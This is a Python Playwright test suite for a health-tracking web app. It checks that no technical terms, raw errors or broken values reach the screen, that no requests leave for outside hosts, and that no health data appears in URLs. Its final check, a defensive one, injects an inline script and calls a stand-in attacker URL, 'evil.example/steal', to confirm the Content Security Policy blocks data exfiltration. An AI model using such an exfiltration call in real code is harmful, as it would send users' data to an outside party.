"""Leak sweep. Walks every tab and every sheet with a realistic five months of data, in
light and dark, and fails if anything technical or broken shows up on screen:
backend or vendor names, code words, raw errors, "undefined", "NaN", "[object Object]".
Also fails on any blocked request or script, any request leaving for a host other than
our own backend, and any health data placed in a URL."""
import asyncio, sys, os, re, subprocess, time
from playwright.async_api import async_playwright

HERE = os.path.dirname(os.path.abspath(__file__))
WWW = os.path.join(HERE, os.pardir, "www")
MOCK = open(os.path.join(HERE, "mock.js")).read()
SEED = open(os.path.join(HERE, "seed.js")).read()
srv = subprocess.Popen([sys.executable, "-m", "http.server", "8773", "-d", WWW],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(1)

BAD = ["supabase", "postgres", "pgrst", "row-level", "jwt", "service_role", "database", "sql",
       "constraint", "relation \"", "null value", "capacitor", "localstorage", "json.parse",
       "typeerror", "referenceerror", "syntaxerror", "stack", "exception", "undefined",
       "nan", "[object", "infinity", "http://", "https://", "api key", "anon key", "webview"]
WORD = re.compile(r"[a-z\[\]_\-\.\"/:]+")
fails = []


def check(name, cond, info=""):
    print(("PASS " if cond else "FAIL ") + name + ("" if cond else "  -> " + str(info)))
    if not cond:
        fails.append(name)


def leaks(text):
    low = text.lower()
    hit = set()
    for w in BAD:
        # whole-word match for short words so "nan" doesn't trip on "nanny", "stack" on "stacked" etc.
        if re.search(r"(?<![a-z])" + re.escape(w) + r"(?![a-z])", low):
            hit.add(w)
    return hit


async def main():
    async with async_playwright() as p:
        b = await p.chromium.launch(executable_path="/usr/bin/google-chrome", args=["--no-sandbox"])
        for scheme in ["light", "dark"]:
            pg = await b.new_page(viewport={"width": 390, "height": 844}, color_scheme=scheme)
            errs, csp, outbound, urls = [], [], [], []
            pg.on("pageerror", lambda e: errs.append(str(e)))
            pg.on("console", lambda m: csp.append(m.text) if "Content Security Policy" in m.text else None)
            pg.on("request", lambda r: (urls.append(r.url), outbound.append(r.url) if not r.url.startswith(("http://localhost:8773", "data:", "blob:")) else None))
            await pg.route("**/vendor/supabase.js", lambda r: asyncio.ensure_future(
                r.fulfill(status=200, content_type="application/javascript", body=MOCK)))
            await pg.route("**/config.js", lambda r: asyncio.ensure_future(
                r.fulfill(status=200, content_type="application/javascript",
                          body='window.HB_CONFIG={supabaseUrl:"https://x.supabase.co",supabaseAnonKey:"k"};')))
            await pg.goto("http://localhost:8773/index.html")
            await pg.wait_for_timeout(700)
            seen = {}

            async def sweep(where):
                t = await pg.inner_text("body")
                for w in leaks(t):
                    seen.setdefault(w, where)

            await sweep("sign-up")
            await pg.click("[data-s=local]"); await pg.wait_for_timeout(200)
            await pg.click("[data-s=goals]"); await pg.click("[data-goal=sleep]"); await pg.click("[data-goal=move]")
            await sweep("goals")
            await pg.click("[data-s=day]"); await pg.fill("#su-wake", "07:00"); await pg.fill("#su-bed", "23:00")
            await pg.click("[data-s=devices]"); await sweep("devices")
            await pg.click("[data-s=finish]"); await pg.click("[data-s=done]"); await pg.wait_for_timeout(500)

            # five months of believable data, an experiment, a rough night, and reports
            await pg.route("**/__seed.js", lambda r: asyncio.ensure_future(r.fulfill(status=200, content_type="application/javascript", body=SEED)))
            await pg.add_script_tag(url="/__seed.js")
            await pg.evaluate("""(()=>{ seedDemo(5); const k = TODAY();
              sub(k,"l").sleep = 4.9; sub(k,"l").hrv = 30;
              S.experiments = cleanExperiments([
                {id:"run", title:"No phone after 11 pm", watch:["sleep","mood"], start:addDays(k,-4), len:14, link:dailies()[0].id},
                {id:"old", title:"Walk after lunch", watch:["steps","stress","weight"], start:addDays(k,-40), len:14},
                {id:"thin", title:"Cold shower", watch:["hrv"], start:addDays(k,-200), len:7}]);
              S.reports = {}; reportsCheck(); save(); render(); })()""")

            for v in ["today", "log", "trends", "tasks", "me"]:
                await pg.click(f".tb[data-view={v}]"); await pg.wait_for_timeout(200)
                await sweep(v)
                if v == "tasks":
                    for seg in ["daily", "habit", "todo", "reward", "tracker"]:
                        await pg.click(f"[data-seg={seg}]"); await pg.wait_for_timeout(100); await sweep("tasks/" + seg)
                if v == "trends":
                    for r in ["7", "30", "90"]:
                        await pg.click(f"[data-range='{r}']"); await pg.wait_for_timeout(100); await sweep("trends/" + r)

            sheets = {
                "easy day on": "go('today'); setEasy(TODAY(),true); render()",
                "task detail": "openDetail(dailies()[0].id)",
                "task editor": "editTask(dailies()[0].id)",
                "new habit": "editTask(null,'habit')",
                "tracker editor": "editTracker('sleep')",
                "reward editor": "editReward(null)",
                "import rules": "openImport(null)",
                "running experiment": "openExperiment('run')",
                "finished experiment": "openExperiment('old')",
                "thin experiment": "openExperiment('thin')",
                "new experiment": "newExperiment()",
                "report so far": "openReport('now')",
                "past report": "openReport(Object.keys(S.reports).sort()[0])",
                "delete account": "confirmDeleteAccount()",
            }
            for name, js in sheets.items():
                await pg.evaluate(f"closeSheet(); {js}"); await pg.wait_for_timeout(150)
                await sweep(name)
            # every error the cloud can throw reaches the screen through msgOf
            for raw in ["TypeError: Cannot read properties of undefined (reading 'id')",
                        'duplicate key value violates unique constraint "x"', "JWT expired",
                        "PGRST301", "500 Internal Server Error", "NaN"]:
                out = await pg.evaluate("(m)=>msgOf({message:m})", raw)
                for w in leaks(out):
                    seen.setdefault(w, "error: " + raw[:20])

            check(f"[{scheme}] nothing technical or broken on any screen", not seen, seen)
            check(f"[{scheme}] no script or style blocked", not csp, csp[:3])
            check(f"[{scheme}] no requests leave for other hosts", not outbound, outbound[:3])
            check(f"[{scheme}] no health data in any URL", not any(re.search(r"(sleep|mood|hrv|weight|steps)=", u) for u in urls), urls[:3])
            check(f"[{scheme}] no page errors", not errs, errs[:3])
            await pg.close()

        # the policy itself: blocks a script from anywhere else and blocks sending data out
        pg = await b.new_page()
        await pg.goto("http://localhost:8773/index.html"); await pg.wait_for_timeout(400)
        r = await pg.evaluate("""async ()=>{
            let inline = false; try{ const s = document.createElement('script'); s.textContent = 'window.__x=1'; document.head.appendChild(s); inline = !!window.__x; }catch(e){}
            let out = 'blocked'; try{ await fetch('https://evil.example/steal?d=1'); out = 'sent'; }catch(e){}
            return {inline, out}; }""")
        check("injected inline script can't run", r["inline"] is False, r)
        check("data can't be sent to an outside site", r["out"] == "blocked", r)
        await b.close()
    srv.terminate()
    print("FAILURES:", fails)
    sys.exit(1 if fails else 0)


asyncio.run(main())
